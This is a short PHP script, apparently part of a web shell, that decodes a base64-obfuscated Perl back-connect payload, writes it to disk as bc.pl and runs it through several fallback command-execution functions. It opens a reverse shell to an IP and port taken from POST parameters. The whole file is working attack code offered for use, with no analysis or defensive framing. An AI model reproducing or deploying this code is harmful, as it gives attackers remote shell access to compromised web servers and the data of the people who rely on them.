<?php
$backconnect_perl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KbXkgKCRpYWRkciwkcG9ydCwkY21kKT1AQVJHVjsNCm15ICRwYWRkcj1zb2NrYWRkcl9pbigkcG9ydCwgaW5ldF9hdG9uKCRpYWRkcikpOw0KbXkgJHByb3RvID0gZ2V0cHJvdG9ieW5hbWUoInRjcCIpOw0Kc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90byk7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERJTiwiPiZTT0NLRVQiKTsNCnByaW50IFNPQ0tFVCAiU2hlbGwgdGVzdFxuIjsNCnByaW50IGV4ZWMoJGNtZCk7DQpjbG9zZShTVERJTik7DQpjbG9zZShTVERPVVQpOw0K";

function execmd($cmd)
{
    $funcs=array("shell_exec","exec","passthru","system","popen","proc_open");
    foreach($funcs as $safe)
    {        
        if($safe=="exec")
        {
            $ret=@exec($cmd);
            $ret=join("\n",$ret);
        }
        elseif($safe=="system")
            $ret=@system($cmd);
        elseif($safe=="passthru")
            $ret=@passthru($cmd);            
        elseif($safe=="shell_exec")
            $ret=@shell_exec($cmd);       
    }
    return $ret;
}


@$fh=fopen(getcwd()."/bc.pl",'w');
@fwrite($fh,base64_decode($backconnect_perl));
@fclose($fh);
echo "Attempting to connect...</br>";
execmd("perl ".getcwd()."/bc.pl $_POST[backconnip] $_POST[backconnport]");
?>